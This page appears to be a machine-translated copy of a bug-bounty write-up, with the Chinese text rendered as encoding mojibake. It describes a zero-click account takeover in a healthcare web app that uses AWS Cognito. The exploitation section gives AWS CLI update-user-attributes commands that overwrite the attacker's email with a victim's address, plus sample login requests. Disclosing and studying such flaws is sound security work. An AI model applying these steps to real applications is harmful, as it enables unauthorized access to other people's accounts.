<html>
<head>
<title>Hacking AWS Cognito Misconfiguration to Zero Click Account Takeover</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">é»‘å®¢æ”»å‡»AWSè®¤çŸ¥é”™è¯¯é…ç½®åˆ°é›¶ç‚¹å‡»è´¦æˆ·æ¥ç®¡</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/hacking-aws-cognito-misconfiguration-to-zero-click-account-takeover-36a209a0bd8a?source=collection_archive---------0-----------------------#2022-02-14">https://infosecwriteups.com/hacking-aws-cognito-misconfiguration-to-zero-click-account-takeover-36a209a0bd8a?source=collection_archive---------0-----------------------#2022-02-14</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="9812" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">å¤§å®¶å¥½ï¼Œå¸Œæœ›ä½ ä»¬ä¸€åˆ‡éƒ½å¥½ï¼Œä¿æŒå®‰å…¨ã€‚è¿™ä¸ªåšå®¢æ˜¯å…³äºæˆ‘æœ€è¿‘çš„è´¦æˆ·æ¥ç®¡çš„å‘ç°ã€‚</h2></div><h2 id="e152" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">çµæ„Ÿ</h2><p id="1694" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">æˆ‘æ­£åœ¨æµè§ˆæ¥è‡ªHackerone çš„<a class="ae lx" href="https://hackerone.com/hacktivity" rel="noopener ugc nofollow" target="_blank">é»‘å®¢æ–‡ç« ï¼Œå¹¶è¯»åˆ°äº†ä»¤äººæƒŠè®¶çš„</a><a class="ae lx" href="https://hackerone.com/reports/1342088" rel="noopener ugc nofollow" target="_blank"> Flickrè´¦æˆ·è¢«æ¥ç®¡</a>ã€‚æ„Ÿè°¢Lauritzçš„å‘ç°å’Œä¸€ç¯‡å‡ºè‰²çš„åšæ–‡ã€‚å¦‚æœä½ æ²¡çœ‹è¿‡ï¼Œè¿™é‡Œæ˜¯<a class="ae lx" href="https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œæ˜¯</a>ã€‚æˆ‘è¿˜ä¼šåœ¨è¿™ç¯‡æ–‡ç« çš„æœ€åæä¾›ä¸€äº›å‚è€ƒèµ„æ–™ã€‚</p><h2 id="7aaa" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">ä»‹ç»</h2><p id="baaf" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">æˆ‘æ­£åœ¨æµ‹è¯•ä¸€ä¸ªä¸åŒ»ç–—ä¿å¥ç›¸å…³çš„webåº”ç”¨ç¨‹åºã€‚ä¸€äº›åŠŸèƒ½åŒ…æ‹¬å®‰æ’ä¸åŒ»ç”Ÿçš„é¢„çº¦ã€è®¢è´­è¯å“ã€é€šè¿‡ä¿¡æ¯ä¸ç½‘ç«™å†…çš„åŒ»ç”Ÿäº’åŠ¨ç­‰ã€‚è¿™æ˜¯ä¸€ä¸ªç»è¿‡è®¤è¯çš„æµ‹è¯•ï¼Œæä¾›äº†è¯ä¹¦ã€‚</p><p id="2c27" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”µå­é‚®ä»¶åœ°å€å’Œå…¶ä»–ç»†èŠ‚ä¸èƒ½ä»åº”ç”¨ç¨‹åºä¸­æ›´æ”¹ï¼Œæˆ‘ä»¬å¿…é¡»å‘é€ä¸€ä¸ªè¯·æ±‚æ¥æ”¯æŒä»»ä½•æ›´æ”¹ã€‚</p><p id="9c90" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">ç™»å½•åº”ç”¨ç¨‹åºåï¼Œæˆ‘æ³¨æ„åˆ°ç™»å½•è¯·æ±‚è¢«å‘é€åˆ°Amazon Cognito URLã€‚å¦‚æœä½ éœ€è¦å¯¹ç™»å½•æœ‰ä¸€ä¸ªå…¨é¢çš„äº†è§£ï¼Œè¯·æµè§ˆLaurtizçš„åšå®¢æˆ–Appsecoçš„åšå®¢ã€‚</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi md"><img src="../Images/a4709cb92ed4e15078c710e5b9169077.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*5SJgjglROuC8Onxa.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">å›¾ç‰‡æ‘˜è‡ª<a class="ae lx" href="https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963" rel="noopener ugc nofollow" target="_blank"> Appsecoåšå®¢ã€‚</a></figcaption></figure><p id="b9f8" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">å› æ­¤ï¼Œæˆ‘æµ‹è¯•çš„åº”ç”¨ç¨‹åºçš„ç™»å½•æµç¨‹å¦‚ä¸‹ã€‚</p><ul class=""><li id="b468" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">ç™»å½•è¯¥åº”ç”¨ç¨‹åºï¼Œä¸€ä¸ªPOSTè¯·æ±‚è¢«å‘é€åˆ°Amazon Cognito</li><li id="d854" class="mt mu it lg b lh nc lk nd kr ne kv nf kz ng lw my mz na nb bi translated">å¦‚æœå‡­è¯æœ‰æ•ˆï¼ŒAmazon Cognitoä¼šæä¾›ä»£å¸ã€‚</li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="8763" class="ki kj it ni b gy nm nn l no np">HTTP/2 200 OK<br/>Date: Thu, 32 Abc 2040 25:51:36 GMT<br/>[...]</span><span id="2dd7" class="ki kj it ni b gy nq nn l no np">{<br/>    "AuthenticationResult":    <br/>        {<br/>            "AccessToken":"[REDACTED]",<br/>            "ExpiresIn":3600,<br/>            "IdToken":"[REDACTED]",<br/>            "RefreshToken":"[REDACTED]",<br/>            "TokenType":"Bearer"<br/>        },<br/>        "ChallengeParameters":<br/>        {            <br/>        }<br/>}</span></pre><ul class=""><li id="543f" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">æ¥ä¸‹æ¥ï¼Œè¯¥åº”ç”¨ç¨‹åºå‘Amazon Cognitoå‘é€è¯·æ±‚ä»¥è·å–ç”¨æˆ·è¯¦ç»†ä¿¡æ¯ã€‚å…·ä½“æ¥è¯´ï¼Œ<code class="fe nr ns nt ni b">X-Amz-Target: AWSCognitoIdentityProviderService.GetUser</code>å¤´åœ¨postè¯·æ±‚ä¸­ä¸AccessTokenä¸€èµ·å‘é€ã€‚</li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="7ddc" class="ki kj it ni b gy nm nn l no np">POST / HTTP/1.1<br/>Host: cognito-idp.eu-west-1.amazonaws.com<br/>Referer: https://target<br/>Content-Type: application/x-amz-json-1.1<br/><strong class="ni iu">X-Amz-Target: AWSCognitoIdentityProviderService.GetUser<br/></strong>X-Amz-User-Agent: aws-amplify/0.1.x js<br/>Origin: https://target<br/>Content-Length: 1021<br/>Connection: close</span><span id="8690" class="ki kj it ni b gy nq nn l no np">{"AccessToken":"&lt;AccessToken&gt;"}</span></pre><ul class=""><li id="cc98" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">ç”¨æˆ·å±æ€§å¯ä»¥åœ¨å“åº”ä¸­è·å¾—:</li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="0468" class="ki kj it ni b gy nm nn l no np">{<br/>  "UserAttributes": [<br/>    {<br/>      "Name": "sub",<br/>      "Value": "d7fdsfdfdsfdf9-4558b142bb58"<br/>    },<br/>    {<br/>      "Name": "email_verified",<br/>      "Value": "true"<br/>    },<br/>    {<br/>      "Name": "given_name",<br/>      "Value": "asddfdf"<br/>    },<br/>    {<br/>      "Name": "family_name",<br/>      "Value": "asdsddfdf"<br/>    },<br/>    {<br/>      "Name": "email",<br/>      "Value": "attacker@domain.com"<br/>    }<br/>  ],<br/>  "Username": "sdfdsfdff8b142bb58"<br/>}</span></pre><h2 id="fa4f" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">å‰¥å‰Š</h2><p id="4b40" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">ç™»å½•åè·å¾—çš„AccessTokenå¯ä»¥ç›´æ¥ä¸AWS-CLIä¸€èµ·ä½¿ç”¨ã€‚æŒ‰ç…§Lauritzåšå®¢ä¸­çš„æ­¥éª¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤è·å–ç”¨æˆ·å±æ€§ã€‚</p><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="c228" class="ki kj it ni b gy nm nn l no np">aws --no-verify-ssl cognito-idp get-user --region eu-west-1 --access-token &lt;Insert Token Here&gt;</span></pre><p id="06f4" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">ç”¨æˆ·å±æ€§å¯ä»¥åœ¨<code class="fe nr ns nt ni b">update-user-attributes</code>çš„å¸®åŠ©ä¸‹ä¿®æ”¹ã€‚æˆ‘å°è¯•æ·»åŠ æ–°çš„å±æ€§ï¼Œä½†æ˜¯ï¼Œè¿™æ˜¯ä¸å…è®¸çš„ã€‚æ‰€ä»¥ï¼Œæˆ‘æœ€åˆå°è¯•æ”¹å˜ç°æœ‰çš„å±æ€§<code class="fe nr ns nt ni b">given_name</code>ï¼Œå¹¶ä¸”æˆåŠŸäº†ã€‚</p><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="0f42" class="ki kj it ni b gy nm nn l no np">aws --no-verify-ssl cognito-idp update-user-attributes --region eu-west-1 --access-token &lt;Insert Token Here&gt;  --user-attributes '<strong class="ni iu">Name=given_name,Value=changed by AWS-CLI</strong>'</span></pre><p id="dafc" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">åœ¨è¿™ä¹‹åï¼Œå¦‚æœæˆ‘è·å–ç”¨æˆ·å±æ€§ï¼Œ<code class="fe nr ns nt ni b">given_name</code>ç¡®å®è¢«æ”¹å˜äº†ã€‚</p><p id="26f9" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">ç°åœ¨æ˜¯æ—¶å€™æ›´æ”¹ç”µå­é‚®ä»¶äº†ã€‚ä»¥ä¸‹æ˜¯æ¦‚å¿µè¯æ˜æ­¥éª¤</p><ul class=""><li id="f37d" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">ä½¿ç”¨ä»¥ä¸‹è¯¦ç»†ä¿¡æ¯åˆ›å»ºä¸¤ä¸ªå¸æˆ·</li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="1770" class="ki kj it ni b gy nm nn l no np">## Account 1<br/>- email   : attacker@domain.com<br/>- password: attackerRocks@!</span><span id="06e9" class="ki kj it ni b gy nq nn l no np">## Account 2<br/>- email   : victim@domain.com<br/>- password: victimaccount@!</span></pre><ul class=""><li id="9dad" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">ä½œä¸ºæ”»å‡»è€…ç™»å½•å¹¶è·å–è®¿é—®ä»¤ç‰Œã€‚</li><li id="8a68" class="mt mu it lg b lh nc lk nd kr ne kv nf kz ng lw my mz na nb bi translated">ä½¿ç”¨è®¿é—®ä»¤ç‰Œï¼Œé€šè¿‡AWS CLIå°†<code class="fe nr ns nt ni b">email</code>æ›´æ–°ä¸º<code class="fe nr ns nt ni b">victim@domain.com</code></li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="62d0" class="ki kj it ni b gy nm nn l no np">aws --no-verify-ssl cognito-idp update-user-attributes --region eu-west-1 --access-token &lt;Insert Token Here&gt;  --user-attributes '<strong class="ni iu">Name=email,Value=victim@domain.com'</strong></span></pre><ul class=""><li id="a2b4" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">ç”µå­é‚®ä»¶æ›´æ”¹åï¼Œæ‰“å¼€ä¸€ä¸ªæ–°çª—å£ï¼Œç”¨ä¸‹é¢çš„è¯¦ç»†ä¿¡æ¯ç™»å½•ï¼Œæˆ‘ä»¬ä¾µå…¥äº†å—å®³è€…çš„å¸æˆ·ã€‚</li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="d30c" class="ki kj it ni b gy nm nn l no np">email    - victim@domain.com<br/>password - attackerRocks@!</span></pre><ul class=""><li id="1f78" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">å¦‚æœæ‚¨è¿˜æ²¡æœ‰å‘ç°è¿™é‡Œçš„é”™è¯¯ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸåœ°å°†æˆ‘ä»¬çš„ç”µå­é‚®ä»¶æ›´æ”¹ä¸ºå—å®³è€…çš„ç”µå­é‚®ä»¶ï¼Œå¹¶ä½¿ç”¨æ”»å‡»è€…çš„å¯†ç ç™»å½•å—å®³è€…çš„ç”µå­é‚®ä»¶ã€‚</li><li id="21f0" class="mt mu it lg b lh nc lk nd kr ne kv nf kz ng lw my mz na nb bi translated">æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥ç›´æ¥è®¿é—®åº”ç”¨ç¨‹åºä¸Šçš„ä»»ä½•å¸æˆ·ï¼Œè€Œæ— éœ€å—å®³è€…çš„ä»»ä½•å¹²é¢„ã€‚</li></ul><h2 id="17be" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">åº”ç”¨çš„è¡¥ä¸</h2><p id="0377" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">æŠ¥å‘Šåä¸ä¹…ï¼Œæˆ‘å°±æ”¶åˆ°äº†è¡¥ä¸éªŒè¯è¯·æ±‚ã€‚ç°åœ¨ï¼Œå½“æˆ‘è¯•å›¾æ”¹å˜ç”µå­é‚®ä»¶ï¼Œæˆ‘ä»¬å¾—åˆ°è¿™ä¸ªé”™è¯¯</p><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="e2be" class="ki kj it ni b gy nm nn l no np">An error occured (AliasExistsException) when calling the UpdateUserAttributes operation: An account with the given email address already exists.</span></pre><p id="bcc3" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">ç°åœ¨ï¼Œè¯¥åº”ç”¨ç¨‹åºä¸æ˜¯ç›²ç›®åœ°æ”¹å˜ç”µå­é‚®ä»¶ï¼Œè€Œæ˜¯æ£€æŸ¥è¯¥ç”µå­é‚®ä»¶æ˜¯å¦æœ‰ä¸€ä¸ªç°æœ‰çš„å¸æˆ·ã€‚</p><p id="8775" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">æ­£å¦‚æ‰¿è¯ºçš„é‚£æ ·ï¼Œè¿™é‡Œæœ‰ä¸€äº›å¾ˆé…·çš„èµ„æºï¼Œå¯ä»¥ç”¨æ¥å­¦ä¹ å¦‚ä½•å…¥ä¾µAWS Cognitoã€‚</p><h2 id="2343" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">å‚è€ƒ</h2><ul class=""><li id="fe6f" class="mt mu it lg b lh li lk ll kr nu kv nv kz nw lw my mz na nb bi translated"><a class="ae lx" href="https://notsosecure.com/hacking-aws-cognito-misconfigurations" rel="noopener ugc nofollow" target="_blank">ä¸€ä¸ªä¼˜ç§€çš„åšå®¢ï¼Œä»–ä»¬åœ¨è¿™é‡Œè·å¾—äº†AWSè´¦æˆ·çš„ç®¡ç†å‘˜æƒé™</a></li><li id="ecf0" class="mt mu it lg b lh nc lk nd kr ne kv nf kz ng lw my mz na nb bi translated"><a class="ae lx" href="https://andresriancho.com/wp-content/uploads/2019/06/whitepaper-internet-scale-analysis-of-aws-cognito-security.pdf" rel="noopener ugc nofollow" target="_blank">AWSè®¤çŸ¥å®‰å…¨çš„äº’è”ç½‘è§„æ¨¡åˆ†æ</a></li></ul></div><div class="ab cl nx ny hx nz" role="separator"><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc"/></div><div class="im in io ip iq"><h1 id="221d" class="oe kj it bd kk of og oh kn oi oj ok kq jz ol ka ku kc om kd ky kf on kg lc oo bi translated">ğŸ”ˆ ğŸ”ˆInfosec Writeupsæ­£åœ¨ç»„ç»‡å…¶é¦–æ¬¡è™šæ‹Ÿä¼šè®®å’Œç½‘ç»œæ´»åŠ¨ã€‚å¦‚æœä½ å¯¹ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£ï¼Œè¿™æ˜¯æœ€é…·çš„åœ°æ–¹ï¼Œæœ‰16ä¸ªä»¤äººéš¾ä»¥ç½®ä¿¡çš„æ¼”è®²è€…å’Œ10å¤šä¸ªå°æ—¶å……æ»¡åŠ›é‡çš„è®¨è®ºä¼šè®®ã€‚<a class="ae lx" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">æŸ¥çœ‹æ›´å¤šè¯¦æƒ…å¹¶åœ¨æ­¤æ³¨å†Œã€‚</a></h1><div class="op oq gp gr or os"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="ot ab fo"><div class="ou ab ov cl cj ow"><h2 class="bd iu gy z fp ox fr fs oy fu fw is bi translated">IWCon2022 - Infosecä¹¦é¢æŠ¥å‘Šè™šæ‹Ÿä¼šè®®</h2><div class="oz l"><h3 class="bd b gy z fp ox fr fs oy fu fw dk translated">ä¸ä¸–ç•Œä¸Šæœ€ä¼˜ç§€çš„ä¿¡æ¯å®‰å…¨ä¸“å®¶å»ºç«‹è”ç³»ã€‚äº†è§£ç½‘ç»œå®‰å…¨ä¸“å®¶å¦‚ä½•å–å¾—æˆåŠŸã€‚å°†æ–°æŠ€èƒ½æ·»åŠ åˆ°æ‚¨çš„â€¦</h3></div><div class="pa l"><p class="bd b dl z fp ox fr fs oy fu fw dk translated">iwcon.live</p></div></div><div class="pb l"><div class="pc l pd pe pf pb pg mn os"/></div></div></a></div></div></div>    
</body>
</html>